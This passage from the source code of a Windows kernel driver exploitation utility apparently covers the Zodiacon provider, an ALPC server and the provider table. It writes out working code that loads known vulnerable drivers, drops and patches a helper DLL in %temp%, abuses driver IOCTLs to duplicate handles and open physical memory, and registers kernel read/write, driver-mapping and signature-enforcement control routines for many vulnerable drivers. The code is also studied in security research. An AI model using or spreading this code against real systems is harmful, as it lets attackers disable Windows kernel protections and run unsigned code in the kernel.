        lpCommand = (LPWSTR)L"1";
        break;

    case IDR_KOBJEXP:
    default:
        lpCommand = (LPWSTR)L"0";
        lpTargetName = (LPWSTR)ZODIACON_SYSEXP_EXE;
        break;
    }

    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
    if (cch == 0 || cch > MAX_PATH) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    PBYTE dllBuffer;

    dllBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI64,
        GetModuleHandle(NULL),
        &resourceSize,
        PROVIDER_RES_KEY,
        TRUE);

    if (dllBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Failed to load helper dll\r\n");

        return FALSE;

    }

    if (supReplaceDllEntryPoint(dllBuffer,
        resourceSize,
        (LPCSTR)"RegisterForProvider2",
        TRUE))
    {
        StringCchPrintf(szFileName, MAX_PATH * 2,
            TEXT("%ws\\%ws"),
            szTemp,
            lpTargetName);

        NTSTATUS ntStatus;

        if (supWriteBufferToFile(szFileName,
            dllBuffer,
            resourceSize,
            TRUE,
            FALSE,
            &ntStatus))
        {

            STARTUPINFO si;
            PROCESS_INFORMATION pi;

            RtlSecureZeroMemory(&si, sizeof(si));
            RtlSecureZeroMemory(&pi, sizeof(pi));

            si.cb = sizeof(si);
            GetStartupInfo(&si);

            if (CreateProcess(szFileName,
                lpCommand,
                NULL,
                NULL,
                TRUE,
                CREATE_SUSPENDED,
                NULL,
                szTemp,
                &si,
                &pi))
            {

                ipcServer = IpcStartApiServer(supIpcDuplicateHandleCallback,
                    supIpcOnException,
                    NULL,
                    NULL,
                    (PVOID)Context);

                ResumeThread(pi.hThread);
            }

            if (ipcServer) {
                WaitForSingleObject(pi.hProcess, INFINITE);
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            bResult = (Context->DeviceHandle != NULL);

        }
        else {
            supShowHardError("[!] Failed to write help dll on disk", ntStatus);
        }

    }
    else {
        supPrintfEvent(kduEventError, "[!] Error while configuring helper dll\r\n");
    }

    supHeapFree(dllBuffer);

    return bResult;
}

/*
* ZdcDuplicateHandle2
*
* Purpose:
*
* Duplicate handle via Zodiacon driver request.
*
*/
BOOL ZdcDuplicateHandle2(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE SourceProcessId,
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
)
{
    KZODIACON_DUP_DATA_V2 request;

    UNREFERENCED_PARAMETER(SourceProcessHandle);
    UNREFERENCED_PARAMETER(HandleAttributes);
    UNREFERENCED_PARAMETER(Options);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.SourcePid = HandleToUlong(SourceProcessId);
    request.Handle = SourceHandle;
    request.AccessMask = DesiredAccess;
    request.Flags = DUPLICATE_SAME_ACCESS;

    *TargetHandle = NULL;

    return supCallDriver(DeviceHandle,
        IOCTL_KANYEXP_DUPLICATE_OBJECT,
        &request,
        sizeof(request),
        TargetHandle,
        sizeof(PVOID));
}

/*
* ZdcDuplicateHandle
*
* Purpose:
*
* Duplicate handle via Zodiacon driver request.
*
*/
BOOL ZdcDuplicateHandle(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE SourceProcessId,
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
)
{
    KZODIACON_DUP_DATA request;

    UNREFERENCED_PARAMETER(SourceProcessHandle);
    UNREFERENCED_PARAMETER(HandleAttributes);
    UNREFERENCED_PARAMETER(Options);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.SourcePid = HandleToUlong(SourceProcessId);
    request.Handle = HandleToUlong(SourceHandle);
    request.AccessMask = DesiredAccess;
    request.Flags = DUPLICATE_SAME_ACCESS;

    *TargetHandle = NULL;

    return supCallDriver(DeviceHandle,
        IOCTL_KANYEXP_DUPLICATE_OBJECT,
        &request,
        sizeof(request),
        TargetHandle,
        sizeof(PVOID));
}

/*
* ZdcRegisterDriver
*
* Purpose:
*
* Driver initialization routine.
*
*/
BOOL WINAPI ZdcRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);
    pfnDuplicateHandleCallback callback;

    //
    // Workaround for Yosifovich bugs.
    //

    switch (DriverId) {
    case IDR_KREGEXP:
        callback = ZdcDuplicateHandle2;
        break;
    default:
        callback = ZdcDuplicateHandle;
        break;
    }

    return supOpenPhysicalMemory2(DeviceHandle,
        callback,
        &g_ZdcPhysicalMemorySection);
}

/*
* ZdcUnregisterDriver
*
* Purpose:
*
* Free driver related resources.
*
*/
BOOL WINAPI ZdcUnregisterDriver(
    _In_ HANDLE DeviceHandle)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    if (g_ZdcPhysicalMemorySection) {
        NtClose(g_ZdcPhysicalMemorySection);
        g_ZdcPhysicalMemorySection = NULL;
    }

    return TRUE;
}

/*
* ZdcStartVulnerableDriver
*
* Purpose:
*
* Load/open vulnerable driver callback.
*
*/
BOOL ZdcStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bLoaded = FALSE;
    NTSTATUS ntStatus;
    KDU_DB_ENTRY* provLoadData = Context->Provider->LoadData;
    LPWSTR lpDeviceName = provLoadData->DeviceName;
    LPWSTR lpDriverName = provLoadData->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        if (!KDUProvExtractVulnerableDriver(Context))
            return FALSE;

        ntStatus = supLoadDriverEx(lpDriverName,
            lpFullFileName,
            FALSE,
            NULL,
            NULL);

        if (NT_SUCCESS(ntStatus)) {

            supPrintfEvent(kduEventInformation,
                "[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);

            bLoaded = TRUE;
        }
        else {
            supShowHardError("[!] Unable to load vulnerable driver", ntStatus);
            DeleteFile(lpFullFileName);
        }

    }

    if (bLoaded) {

        printf_s("[+] Acquiring handle for driver device \"%ws\" -> please wait, this can take a few seconds\r\n",
            provLoadData->DeviceName);

        if (ZdcpOpenDriver(Context)) {

            supPrintfEvent(kduEventInformation,
                "[+] Successfully acquired handle for driver device \"%ws\"\r\n",
                provLoadData->DeviceName);

        }
    }

    return (Context->DeviceHandle != NULL);
}

```

`Source/Hamakaze/idrv/zodiacon.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       ZODIACON.H
*
*  VERSION:     1.32
*
*  DATE:        10 Jun 2023
*
*  Zodiacon drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define ZODIACON_DEVICE (DWORD)0x8000

#define ZODIACON_DUP_HANDLE (DWORD)0x801

#define IOCTL_KANYEXP_DUPLICATE_OBJECT \
    CTL_CODE(ZODIACON_DEVICE, ZODIACON_DUP_HANDLE, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_KOBEXP_READ_VMEM        \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_OUT_DIRECT, FILE_READ_ACCESS)

#define IOCTL_KOBEXP_WRITE_VMEM       \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_IN_DIRECT, FILE_WRITE_ACCESS)

typedef struct _KZODIACON_DUP_DATA {
    ULONG Handle;
    ULONG SourcePid;
    ULONG AccessMask;
    ULONG Flags;
} KZODIACON_DUP_DATA, *PKZODIACON_DUP_DATA;

//
// Yep, screwed up with previously compiled drivers.
//

typedef struct _KZODIACON_DUP_DATA_V2 {
    HANDLE Handle;
    ULONG SourcePid;
    ULONG AccessMask;
    ULONG Flags;
} KZODIACON_DUP_DATA_V2, *PKZODIACON_DUP_DATA_V2;


BOOL WINAPI KObExpReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI KObExpWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI ZdcWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI ZdcReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI ZdcVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI ZdcQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI ZdcWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI ZdcReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI ZdcRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI ZdcUnregisterDriver(
    _In_ HANDLE DeviceHandle);

BOOL ZdcStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

```

`Source/Hamakaze/ipcsvc.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2026
*
*  TITLE:       IPCSVC.CPP
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Inter-process communication, simplified ALPC server.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "../Shared/ntos/ntalpc.h"

void IpcpSetMessageSize(
    _In_ PPORT_MESSAGE64 Message,
    _In_ ULONG Size
)
{
    Message->u1.s1.TotalLength = (CSHORT)(Size + sizeof(PORT_MESSAGE64));
    Message->u1.s1.DataLength = (CSHORT)Size;
}

NTSTATUS IpcpCreateServerPort(
    _Out_ PHANDLE PortHandle)
{
    NTSTATUS ntStatus;
    ULONG sdLength;
    ALPC_PORT_ATTRIBUTES portAttr;
    PSECURITY_DESCRIPTOR pSD;
    PACL dacl;
    PSID adminSid;

    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    UCHAR sidBuffer[FIELD_OFFSET(SID, SubAuthority) + sizeof(ULONG) * 2];
    SID everyoneSid = { SID_REVISION, 1, SECURITY_WORLD_SID_AUTHORITY, { SECURITY_WORLD_RID } };

    OBJECT_ATTRIBUTES attr;
    UNICODE_STRING portName;

    adminSid = (PSID)sidBuffer;
    RtlInitializeSid(adminSid, &ntAuthority, 2);
    *RtlSubAuthoritySid(adminSid, 0) = SECURITY_BUILTIN_DOMAIN_RID;
    *RtlSubAuthoritySid(adminSid, 1) = DOMAIN_ALIAS_RID_ADMINS;

    sdLength = (ULONG)SECURITY_DESCRIPTOR_MIN_LENGTH +
        (ULONG)sizeof(ACL) +
        (ULONG)sizeof(ACCESS_ALLOWED_ACE) +
        RtlLengthSid(adminSid) +
        (ULONG)sizeof(ACCESS_ALLOWED_ACE) +
        RtlLengthSid(&everyoneSid);

    pSD = supHeapAlloc(sdLength);
    if (pSD) {
        dacl = (PACL)RtlOffsetToPointer(pSD, SECURITY_DESCRIPTOR_MIN_LENGTH);
        RtlCreateSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
        RtlCreateAcl(dacl, sdLength - SECURITY_DESCRIPTOR_MIN_LENGTH, ACL_REVISION);
        RtlAddAccessAllowedAce(dacl, ACL_REVISION, PORT_ALL_ACCESS, adminSid);
        RtlAddAccessAllowedAce(dacl, ACL_REVISION, PORT_CONNECT, &everyoneSid);
        RtlSetDaclSecurityDescriptor(pSD, TRUE, dacl, FALSE);
    }
    else {
        return STATUS_MEMORY_NOT_ALLOCATED;
    }

    RtlInitUnicodeString(&portName, KDU_PORT_NAME);
    InitializeObjectAttributes(&attr, &portName, OBJ_CASE_INSENSITIVE, NULL, pSD);

    RtlSecureZeroMemory(&portAttr, sizeof(portAttr));
    portAttr.MaxMessageLength = sizeof(KDU_LPC_MESSAGE);

    ntStatus = NtAlpcCreatePort(PortHandle, &attr, &portAttr);

    supHeapFree(pSD);

    return ntStatus;
}

DWORD WINAPI IpcPortThreadWorker(
    _In_ LPVOID Param
)
{
    NTSTATUS ntStatus;
    LONG_PTR index;
    HANDLE serverPort = NULL;
    HANDLE clientPort;

    PKDU_LPC_MESSAGE plpcTxMsg = NULL;
    PKDU_MSG pMsg;
    LPVOID contextPtr;

    PKDU_SERVER_PARAMS serverParams = (PKDU_SERVER_PARAMS)Param;

#define MAX_KDU_CLIENTS 2
    HANDLE portClients[MAX_KDU_CLIENTS];
    KDU_LPC_MESSAGE lpcTxMsg, lpcRxMsg;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    ntStatus = IpcpCreateServerPort(&serverPort);
    if (!NT_SUCCESS(ntStatus))
        return (DWORD)-2;

    RtlSecureZeroMemory(&portClients, sizeof(portClients));
    RtlSecureZeroMemory(&lpcTxMsg, sizeof(lpcTxMsg));
    RtlSecureZeroMemory(&lpcRxMsg, sizeof(lpcRxMsg));

    while (TRUE) {

        contextPtr = NULL;

        ntStatus = NtReplyWaitReceivePort(serverPort,
            &contextPtr,
            (PPORT_MESSAGE)plpcTxMsg,
            (PPORT_MESSAGE)&lpcRxMsg);

        plpcTxMsg = NULL;

        if (!NT_SUCCESS(ntStatus))
            continue;

        switch (lpcRxMsg.Header.u2.s2.Type & (~LPC_CONTINUATION_REQUIRED))
        {

        case LPC_CONNECTION_REQUEST:

            index = -1;
            for (INT c = 0; c < MAX_KDU_CLIENTS; ++c)
            {
                if (portClients[c] == NULL)
                {
                    index = c;
                    break;
                }
            }

            clientPort = NULL;
            if (index >= 0) {

                if (serverParams->OnConnect) {
                    serverParams->OnConnect((PCLIENT_ID)&lpcRxMsg.Header.ClientId,
                        TRUE,
                        serverParams->UserContext);
                }

                ntStatus = NtAlpcAcceptConnectPort(&clientPort,
                    serverPort,
                    0,
                    NULL,
                    NULL,
                    (PVOID)(index + 4096),
                    (PPORT_MESSAGE)&lpcRxMsg.Header,
                    NULL,
                    TRUE);

                if (NT_SUCCESS(ntStatus)) {
                    portClients[index] = clientPort;
                }


            }
            else {

                if (serverParams->OnConnect) {
                    serverParams->OnConnect((PCLIENT_ID)&lpcRxMsg.Header.ClientId,
                        FALSE,
                        serverParams->UserContext);
                }

                NtAlpcAcceptConnectPort(&clientPort,
                    serverPort,
                    0,
                    NULL,
                    NULL,
                    NULL,
                    (PPORT_MESSAGE)&lpcRxMsg.Header,
                    NULL,
                    FALSE);

            }

            break;

        case LPC_CLIENT_DIED:
        case LPC_PORT_CLOSED:

            index = (LONG_PTR)contextPtr - 4096;
            if (index >= 0 && index < MAX_KDU_CLIENTS) {
                if (portClients[index] != NULL)
                {
                    NtAlpcDisconnectPort(portClients[index], 0);

                    if (serverParams->OnPortClose) {
                        serverParams->OnPortClose(portClients[index],
                            serverParams->UserContext);
                    }

                    NtClose(portClients[index]);
                    portClients[index] = NULL;
                }
            }
            break;

        case LPC_REQUEST:

            pMsg = (PKDU_MSG)&lpcRxMsg.Data[0];
            __try {
                serverParams->OnReceive((CLIENT_ID*)&lpcRxMsg.Header.ClientId,
                    pMsg,
                    serverParams->UserContext);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                serverParams->OnReceiveException(GetExceptionCode(), serverParams->UserContext);
            }

            RtlSecureZeroMemory(&lpcTxMsg, sizeof(lpcTxMsg));
            IpcpSetMessageSize((PPORT_MESSAGE64)&lpcTxMsg.Header, sizeof(KDU_MSG));
            lpcTxMsg.Header.u2.s2.Type = LPC_REPLY;
            lpcTxMsg.Header.MessageId = lpcRxMsg.Header.MessageId;
            plpcTxMsg = &lpcTxMsg;

            break;

        default:
            break;
        }

    }

    if (serverPort)
        NtClose(serverPort);

    ExitThread(ERROR_SUCCESS);
}

PVOID IpcStartApiServer(
    _In_ IpcOnReceive OnReceive,
    _In_ IpcOnException OnException,
    _In_opt_ IpcOnConnect OnConnect,
    _In_opt_ IpcOnPortClose OnPortClose,
    _In_opt_ PVOID UserContext
)
{
    DWORD dwThreadId = 0;

    PKDU_SERVER_PARAMS params;

    params = (PKDU_SERVER_PARAMS)supHeapAlloc(sizeof(KDU_SERVER_PARAMS));
    if (params) {

        params->OnReceive = OnReceive;
        params->UserContext = UserContext;
        params->OnReceiveException = OnException;
        if (OnConnect) params->OnConnect = OnConnect;
        if (OnPortClose) params->OnPortClose = OnPortClose;

        HANDLE hThread = CreateThread(NULL,
            0,
            (LPTHREAD_START_ROUTINE)IpcPortThreadWorker,
            (PVOID)params,
            0,
            &dwThreadId);

        if (hThread) {
            params->ServerHandle = hThread;
        }
        else
        {
            supHeapFree(params);
            params = NULL;
        }

    }

    return params;
}

#pragma warning(push)
#pragma warning(disable: 6258)
BOOL IpcStopApiServer(
    PVOID ServerHandle
)
{
    PKDU_SERVER_PARAMS params = (PKDU_SERVER_PARAMS)ServerHandle;

    if (params == NULL) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (WaitForSingleObject(params->ServerHandle, 2000) == WAIT_TIMEOUT)
        TerminateThread(params->ServerHandle, 0);

    CloseHandle(params->ServerHandle);

    supHeapFree(params);

    return TRUE;
}
#pragma warning(pop)

```

`Source/Hamakaze/ipcsvc.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       IPCSVC.H
*
*  VERSION:     1.20
*
*  DATE:        10 Feb 2022
*
*  Inter-process communication prototypes and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define KDU_PORT_NAME L"\\KduPort"

typedef struct _KDU_LPC_MESSAGE {
    PORT_MESSAGE64 Header;
    BYTE Data[128];
} KDU_LPC_MESSAGE, * PKDU_LPC_MESSAGE;

typedef struct _KDU_MSG {
    ULONG Function;
    NTSTATUS Status;
    ULONG64 Data;
    ULONG64 ReturnedLength;
} KDU_MSG, * PKDU_MSG;

typedef VOID(CALLBACK* IpcOnReceive)(
    _In_ PCLIENT_ID ClientId,
    _In_ PKDU_MSG Message,
    _In_opt_ PVOID UserContext
    );

typedef VOID(CALLBACK* IpcOnConnect)(
    _In_ PCLIENT_ID ClientId,
    _In_ BOOLEAN ConnectionAccepted,
    _In_opt_ PVOID UserContext
    );

typedef VOID(CALLBACK* IpcOnException)(
    _In_ ULONG ExceptionCode,
    _In_opt_ PVOID UserContext
    );

typedef VOID(CALLBACK* IpcOnPortClose)(
    _In_ HANDLE PortHandle,
    _In_opt_ PVOID UserContext
    );

typedef struct _KDU_SERVER_PARAMS {
    IpcOnReceive OnReceive;
    IpcOnException OnReceiveException;
    IpcOnConnect OnConnect;
    IpcOnPortClose OnPortClose;
    PVOID UserContext;
    HANDLE ServerHandle;
} KDU_SERVER_PARAMS, * PKDU_SERVER_PARAMS;

PVOID IpcStartApiServer(
    _In_ IpcOnReceive OnReceive,
    _In_ IpcOnException OnException,
    _In_opt_ IpcOnConnect OnConnect,
    _In_opt_ IpcOnPortClose OnPortClose,
    _In_opt_ PVOID UserContext);

BOOL IpcStopApiServer(
    PVOID ServerHandle);

```

`Source/Hamakaze/kduplist.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       KDUPLIST.H
*
*  VERSION:     1.45
*
*  DATE:        02 Dec 2025
*
*  Providers global list.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#include "idrv/intel.h"
#include "idrv/rtcore.h"
#include "idrv/mapmem.h"
#include "idrv/atszio.h"
#include "idrv/winio.h"
#include "idrv/winring0.h"
#include "idrv/phymem.h"
#include "idrv/lha.h"
#include "idrv/directio64.h"
#include "idrv/gmer.h"
#include "idrv/dell.h"
#include "idrv/mimidrv.h"
#include "idrv/kph.h"
#include "idrv/procexp.h"
#include "idrv/dbk.h"
#include "idrv/marvinhw.h"
#include "idrv/zemana.h"
#include "idrv/asrdrv.h"
#include "idrv/alcpu.h"
#include "idrv/amd.h"
#include "idrv/hilscher.h"
#include "idrv/lenovo.h"
#include "idrv/hp.h"
#include "idrv/zodiacon.h"
#include "idrv/echodrv.h"
#include "idrv/nvidia.h"
#include "idrv/binalyze.h"
#include "idrv/rzpnk.h"
#include "idrv/evga.h"
#include "idrv/netease.h"
#include "idrv/tpup.h"
#include "idrv/tpw.h"

//
// Victims public array.
//
static KDU_VICTIM_PROVIDER g_KDUVictims[] = {
    {
        (LPCWSTR)PROCEXP152,              // Device and driver name,
        (LPCWSTR)PROCEXP1627_DESC,        // Description
        IDR_PROCEXP1627,                  // Resource id in drivers database
        KDU_VICTIM_PE1627,                // Victim id
        SYNCHRONIZE |
        GENERIC_READ | GENERIC_WRITE,     // Desired access flags used for acquiring victim handle
        KDU_VICTIM_FLAGS_SUPPORT_RELOAD,  // Victim flags, target dependent
        VpCreateCallback,                 // Victim create callback
        VpReleaseCallback,                // Victim release callback
        VpExecuteCallback,                // Victim execute payload callback
        &g_ProcExpSig,                    // Victim dispatch bytes
        sizeof(g_ProcExpSig)              // Victim dispatch bytes size
    },

    {
        (LPCWSTR)PROCEXP152,              // Device and driver name,
        (LPCWSTR)PROCEXP1702_DESC,        // Description
        IDR_PROCEXP1702,                  // Resource id in drivers database
        KDU_VICTIM_PE1702,                // Victim id
        SYNCHRONIZE |
        GENERIC_READ | GENERIC_WRITE,     // Desired access flags used for acquiring victim handle
        KDU_VICTIM_FLAGS_SUPPORT_RELOAD,  // Victim flags, target dependent
        VpCreateCallback,                 // Victim create callback
        VpReleaseCallback,                // Victim release callback
        VpExecuteCallback,                // Victim execute payload callback
        &g_ProcExpSig,                    // Victim dispatch bytes
        sizeof(g_ProcExpSig)              // Victim dispatch bytes size
    }

};

//
// Providers public array, unsupported methods must be set to NULL.
//
static KDU_PROVIDER g_KDUProviders[] =
{
    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)NalReadVirtualMemoryEx,
        (provWriteKernelVM)NalWriteVirtualMemoryEx,

        (provVirtualToPhysical)NalVirtualToPhysical,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)RTCoreReadVirtualMemory,
        (provWriteKernelVM)RTCoreWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)MapMemRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)MapMemReadKernelVirtualMemory,
        (provWriteKernelVM)MapMemWriteKernelVirtualMemory,

        (provVirtualToPhysical)MapMemVirtualToPhysical,
        (provQueryPML4)MapMemQueryPML4Value,
        (provReadPhysicalMemory)MapMemReadPhysicalMemory,
        (provWritePhysicalMemory)MapMemWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)AtszioReadKernelVirtualMemory,
        (provWriteKernelVM)AtszioWriteKernelVirtualMemory,

        (provVirtualToPhysical)AtszioVirtualToPhysical,
        (provQueryPML4)AtszioQueryPML4Value,
        (provReadPhysicalMemory)AtszioReadPhysicalMemory,
        (provWritePhysicalMemory)AtszioWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WRZeroReadKernelVirtualMemory,
